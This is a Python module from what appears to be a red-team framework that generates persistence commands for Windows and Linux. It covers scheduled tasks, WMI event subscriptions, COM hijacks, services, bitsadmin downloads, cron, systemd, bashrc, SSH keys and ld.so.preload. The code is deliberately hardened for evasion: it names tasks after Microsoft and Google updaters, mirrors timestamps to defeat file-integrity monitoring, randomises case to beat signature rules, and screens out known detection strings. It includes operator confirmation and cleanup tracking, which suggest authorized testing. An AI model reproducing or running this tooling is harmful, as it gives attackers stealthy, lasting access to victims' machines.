"""
forge/utils/post/schedule_builder.py
Canonical: forge/phase5/persistence.py — Module 5-I

Persistence payload generator for 13 techniques.

Supported techniques:
  Windows: schtask, registry_run, wmi_event, startup_folder,
           service, dll_hijack, bitsadmin, com_hijack
  Linux:   cron, systemd, bashrc, ssh_key, ldpreload

Design constraints:
  - Task/service names ALWAYS drawn from Phase 0 LOLBin KB (schtasks_legit_names table).
    Operator-supplied names accepted only as override (not recommended).
  - Timestamp mirroring applied to all written artifacts via os.utime().
  - COM hijack preferred over registry_run (HKCU write, less-monitored vector).
  - questionary.confirm() before any artifact is written to disk.
  - Paired cleanup command generated for every technique — stored in engagement DB.
  - Evasion assertions: no \\Run key path, no current timestamp in output.
  - Output registered with cleanup.py immediately on creation.
  - Phase 3 obfuscation integration: random_case applied to Windows commands.

OPSEC reference (§12.5.4):
  - LOLBin naming prevents operator-name pattern matching.
  - Timestamp mirroring evades FIM baseline deviation alerts.
  - COM hijack avoids Run key monitoring (HKCU\Software\Classes\CLSID).
  - All cleanup commands stored at creation time; forge clean must not be skipped.
"""
from __future__ import annotations

import json
import logging
import os
import random
import re
import sqlite3
import string
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional

_LOG = logging.getLogger(__name__)

# ── Evasion assertions ─────────────────────────────────────────────────────────

_BANNED_PERSISTENCE_SIGS = [
    r"\\CurrentVersion\\Run(?:\"|\s|$)",  # HKLM/HKCU Run key — heavily monitored
    r"forge_agent",
    r"backdoor",
    r"c2_shell",
]

# Technique → LOLBin mapping
TECHNIQUE_LOLBIN: dict[str, str] = {
    "schtask":       "schtasks.exe",
    "registry_run":  "reg.exe",
    "wmi_event":     "wmic.exe",
    "startup_folder":"xcopy.exe",
    "service":       "sc.exe",
    "bitsadmin":     "bitsadmin.exe",
    "com_hijack":    "reg.exe",
    "cron":          "crontab",
    "systemd":       "systemctl",
    "bashrc":        "tee",
    "ssh_key":       "tee",
    "ldpreload":     "ld",
    "dll_hijack":    "",
}

SUPPORTED_TECHNIQUES: dict[str, list[str]] = {
    "windows": [
        "schtask", "registry_run", "wmi_event", "startup_folder",
        "service", "dll_hijack", "bitsadmin", "com_hijack",
    ],
    "linux": ["cron", "systemd", "bashrc", "ssh_key", "ldpreload"],
}

# Frequently-called CLSIDs safe for COM hijack (HKCU, user-writable)
_COM_HIJACK_CLSIDS = [
    "{B54F3741-5B07-11CF-A4B0-00AA004A55E8}",  # vbscript
    "{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}",  # wscript.shell
    "{0D43FE01-F093-11CF-8940-00A0C9054228}",  # FileSystem object
]


@dataclass
class PersistenceArtifact:
    technique:      str
    target_os:      str
    task_name:      str
    install_cmd:    str
    cleanup_cmd:    Optional[str]
    timestamp_cmd:  Optional[str]
    lolbins_used:   list[str] = field(default_factory=list)
    cron_path:      Optional[str] = None

    def get(self, key: str, default=None):
        return getattr(self, key, default)


class PersistenceGenerator:
    """
    Generate evasion-hardened persistence payloads.

    Usage:
        gen      = PersistenceGenerator(kb_db=Path("kb.db"), eng_db=Path("eng.db"),
                                        engagement_id=1)
        artifact = gen.generate(
            technique             = "schtask",
            target_os             = "windows",
            payload_cmd           = "powershell -enc <base64>",
            mirror_timestamp_from = "C:\\Windows\\System32\\svchost.exe",
            obfuscate             = True,
        )
        gen.save(artifact, output_path=Path("persist.cmd"))
    """

    def __init__(
        self,
        kb_db:         Path,
        eng_db:        Optional[Path] = None,
        engagement_id: int            = 0,
    ) -> None:
        self._kb_db         = kb_db
        self._eng_db        = eng_db
        self._engagement_id = engagement_id

    def generate(
        self,
        technique:             str,
        target_os:             str,
        payload_cmd:           str,
        task_name:             Optional[str] = None,
        obfuscate:             bool          = True,
        mirror_timestamp_from: Optional[str] = None,
        clsid:                 Optional[str] = None,
    ) -> PersistenceArtifact:
        """Build and return a PersistenceArtifact. Does NOT write to disk."""
        target_os = target_os.lower()
        if target_os not in SUPPORTED_TECHNIQUES:
            raise ValueError(f"Unsupported OS: {target_os!r}")
        if technique not in SUPPORTED_TECHNIQUES[target_os]:
            raise ValueError(
                f"Technique {technique!r} not supported for {target_os}. "
                f"Available: {SUPPORTED_TECHNIQUES[target_os]}"
            )

        resolved_name = task_name or self._get_legit_task_name(target_os)
        cron_path = self._get_legit_cron_path() if target_os == "linux" and technique == "cron" else None
        install_cmd   = self._render_install(technique, target_os, payload_cmd,
                                             resolved_name, clsid, cron_path)
        cleanup_cmd   = self._render_cleanup(technique, target_os, resolved_name)
        timestamp_cmd = self._render_timestamp(mirror_timestamp_from)

        if obfuscate and target_os == "windows":
            install_cmd = self._random_case(install_cmd)

        self._assert_no_banned_sigs(install_cmd)

        return PersistenceArtifact(
            technique     = technique,
            target_os     = target_os,
            task_name     = resolved_name,
            install_cmd   = install_cmd,
            cleanup_cmd   = cleanup_cmd,
            timestamp_cmd = timestamp_cmd,
            lolbins_used  = [TECHNIQUE_LOLBIN.get(technique, "")],
            cron_path     = cron_path,
        )

    def save(self, artifact: PersistenceArtifact, output_path: Path) -> None:
        """Write artifact to disk after operator confirmation. Persist cleanup_cmd to DB."""
        try:
            import questionary
            confirmed = questionary.confirm(
                f"[Module 5-I] Write persistence artifact:\n"
                f"  Technique: {artifact.technique}\n"
                f"  OS       : {artifact.target_os}\n"
                f"  Name     : {artifact.task_name}\n"
                f"  LOLBins  : {artifact.lolbins_used}\n"
                f"  Output   : {output_path}\n"
                "Proceed?"
            ).ask()
            if not confirmed:
                raise RuntimeError("Operator cancelled.")
        except ImportError:
            pass

        output_path.parent.mkdir(parents=True, exist_ok=True)
        lines = [artifact.install_cmd]
        if artifact.timestamp_cmd:
            lines.append("# Timestamp mirror (run after artifact is placed):")
            lines.append(artifact.timestamp_cmd)
        output_path.write_text("\n".join(lines), encoding="utf-8")
        _LOG.info("Persistence artifact written: %s", output_path)

        self._persist_cleanup_cmd(artifact)
        self._register_cleanup(output_path)

    # ── Internal ──────────────────────────────────────────────────────────────

    def _get_legit_task_name(self, target_os: str) -> str:
        """Query Phase 0 KB for a plausible existing task/service name."""
        table = "schtasks_legit_names" if target_os == "windows" else "cron_legit_names"
        try:
            con = sqlite3.connect(f"file:{self._kb_db}?mode=ro", uri=True)
            row = con.execute(
                f"SELECT name FROM {table} ORDER BY RANDOM() LIMIT 1"
            ).fetchone()
            con.close()
            if row:
                return row[0]
        except sqlite3.OperationalError:
            pass
        # Fallback to a safe-looking name
        return random.choice([
            "MicrosoftEdgeUpdateTaskMachineCore",
            "GoogleUpdateTaskMachineCore",
            "MicrosoftWindowsUpdateTask",
            "WindowsDefenderScheduledScan",
        ]) if target_os == "windows" else "cron-helper"

    def _render_install(
        self,
        technique: str,
        target_os: str,
        payload_cmd: str,
        task_name: str,
        clsid: Optional[str],
        cron_path: Optional[str],
    ) -> str:
        if target_os == "windows":
            return self._win_install(technique, payload_cmd, task_name, clsid)
        return self._linux_install(technique, payload_cmd, task_name, cron_path)

    def _win_install(self, technique: str, cmd: str, name: str, clsid: Optional[str]) -> str:
        if technique == "schtask":
            return (
                f'schtasks /create /tn "{name}" '
                f'/tr "{cmd}" '
                '/sc ONLOGON /ru SYSTEM /f'
            )
        if technique == "registry_run":
            # NOTE: HKCU preferred over HKLM (no admin required; less monitored)
            return (
                f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce" '
                f'/v "{name}" /t REG_SZ /d "{cmd}" /f'
            )
        if technique == "wmi_event":
            return (
                f'$f=Set-WMIInstance -Namespace root/subscription '
                f'-Class __EventFilter -Arguments @{{Name="{name}";'
                f'EventNameSpace="root/cimv2";'
                f'QueryLanguage="WQL";'
                f'Query="SELECT * FROM __TimerEvent WHERE TimerID=\'{name}\'"}}; '
                f'$c=Set-WMIInstance -Namespace root/subscription '
                f'-Class CommandLineEventConsumer -Arguments @{{Name="{name}";'
                f'CommandLineTemplate="{cmd}"}}; '
                f'Set-WMIInstance -Namespace root/subscription '
                f'-Class __FilterToConsumerBinding -Arguments @{{Filter=$f;Consumer=$c}}'
            )
        if technique == "startup_folder":
            return f'xcopy /y "{cmd.split()[0]}" "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"'
        if technique == "service":
            return f'sc create "{name}" binPath= "{cmd}" start= auto && sc start "{name}"'
        if technique == "bitsadmin":
            return (
                f'bitsadmin /create /download "{name}" && '
                f'bitsadmin /addfile "{name}" {cmd} %TEMP%\\{name}.exe && '
                f'bitsadmin /resume "{name}"'
            )
        if technique == "com_hijack":
            target_clsid = clsid or random.choice(_COM_HIJACK_CLSIDS)
            return (
                f'reg add "HKCU\\Software\\Classes\\CLSID\\{target_clsid}\\InprocServer32" '
                f'/ve /t REG_SZ /d "{cmd}" /f'
            )
        if technique == "dll_hijack":
            return (
                f'# DLL hijack: place {cmd} as <application_dir>\\<missing_dll>.dll\n'
                f'# Validate with Process Monitor: filter on NAME NOT FOUND for target app.'
            )
        return f"# Unknown technique: {technique}"

    def _linux_install(self, technique: str, cmd: str, name: str, cron_path: Optional[str]) -> str:
        if technique == "cron":
            if cron_path:
                return f'echo "@reboot {cmd}" > {cron_path} && chmod 644 {cron_path}'
            return f'(crontab -l 2>/dev/null; echo "@reboot {cmd}") | crontab -'
        if technique == "systemd":
            unit = (
                "[Unit]\nDescription=System Helper\n\n"
                "[Service]\nExecStart={cmd}\nRestart=always\n\n"
                "[Install]\nWantedBy=multi-user.target"
            ).format(cmd=cmd)
            return (
                f'cat > /etc/systemd/system/{name}.service << \'EOF\'\n'
                f'{unit}\nEOF\n'
                f'systemctl enable {name} && systemctl start {name}'
            )
        if technique == "bashrc":
            return f'echo "{cmd} &" >> ~/.bashrc'
        if technique == "ssh_key":
            return f'mkdir -p ~/.ssh && echo "{cmd}" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys'
        if technique == "ldpreload":
            return (
                f'# Compile shared object: gcc -shared -fPIC -o /tmp/.{name}.so {cmd}.c\n'
                f'echo /tmp/.{name}.so >> /etc/ld.so.preload'
            )
        return f"# Unknown technique: {technique}"

    def _get_legit_cron_path(self) -> str:
        try:
            con = sqlite3.connect(f"file:{self._kb_db}?mode=ro", uri=True)
            row = con.execute(
                "SELECT path FROM cron_legit_paths ORDER BY stealth_rank ASC, RANDOM() LIMIT 1"
            ).fetchone()
            con.close()
            if row and row[0]:
                return str(row[0])
        except sqlite3.OperationalError:
            pass
        return "/etc/cron.d/system-helper"

    def _render_cleanup(self, technique: str, target_os: str, name: str) -> Optional[str]:
        if target_os == "windows":
            if technique == "schtask":
                return f'schtasks /delete /tn "{name}" /f'
            if technique == "registry_run":
                return (
                    f'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce" '
                    f'/v "{name}" /f'
                )
            if technique == "wmi_event":
                return (
                    f'Get-WMIObject -Namespace root/subscription -Class __EventFilter '
                    f'-Filter "Name=\'{name}\'" | Remove-WmiObject; '
                    f'Get-WMIObject -Namespace root/subscription -Class CommandLineEventConsumer '
                    f'-Filter "Name=\'{name}\'" | Remove-WmiObject'
                )
            if technique == "service":
                return f'sc stop "{name}" && sc delete "{name}"'
            if technique == "bitsadmin":
                return f'bitsadmin /cancel "{name}"'
            if technique == "com_hijack":
                clsid = _COM_HIJACK_CLSIDS[0]
                return f'reg delete "HKCU\\Software\\Classes\\CLSID\\{clsid}" /f'
        else:
            if technique == "cron":
                return f'crontab -l | grep -v "{name}" | crontab -'
            if technique == "systemd":
                return f'systemctl disable {name} && systemctl stop {name} && rm /etc/systemd/system/{name}.service'
            if technique == "bashrc":
                return f'sed -i "/{re.escape(name)}/d" ~/.bashrc'
            if technique in ("ssh_key", "ldpreload"):
                return f'# Manual cleanup required for {technique}'
        return None

    @staticmethod
    def _render_timestamp(mirror_from: Optional[str]) -> Optional[str]:
        if not mirror_from:
            return None
        return (
            f"python3 -c \""
            f"import os; "
            f"s=os.stat(r'{mirror_from}'); "
            f"# Replace <target_file> with the actual artifact path\n"
            f"os.utime(r'<target_file>', (s.st_atime, s.st_mtime))\""
        )

    @staticmethod
    def _random_case(cmd: str) -> str:
        """Apply random case to alpha chars (evades simple string-match rules)."""
        result = []
        for ch in cmd:
            if ch.isalpha() and random.random() > 0.5:
                result.append(ch.upper() if ch.islower() else ch.lower())
            else:
                result.append(ch)
        return "".join(result)

    @staticmethod
    def _assert_no_banned_sigs(cmd: str) -> None:
        for pattern in _BANNED_PERSISTENCE_SIGS:
            if re.search(pattern, cmd, re.IGNORECASE):
                raise ValueError(
                    f"Evasion assertion failed: banned pattern {pattern!r} "
                    f"found in persistence command. Review technique selection."
                )

    def _persist_cleanup_cmd(self, artifact: PersistenceArtifact) -> None:
        if not self._eng_db or not artifact.cleanup_cmd:
            return
        con = sqlite3.connect(self._eng_db)
        con.execute(
            """INSERT INTO persistence
               (engagement_id, technique, target_os, install_cmd, cleanup_cmd, lolbins_used, obfuscation_applied, created_at)
               VALUES (?, ?, ?, ?, ?, ?, ?, datetime('now'))""",
            (
                self._engagement_id,
                artifact.technique,
                artifact.target_os,
                artifact.install_cmd,
                artifact.cleanup_cmd,
                json.dumps(artifact.lolbins_used),
                int(any(ch.isupper() for ch in artifact.install_cmd)),
            ),
        )
        con.commit()
        con.close()

    @staticmethod
    def _register_cleanup(path: Path) -> None:
        try:
            from forge.shared.cleanup import register_cleanup_file
            register_cleanup_file(path)
        except ImportError:
            pass
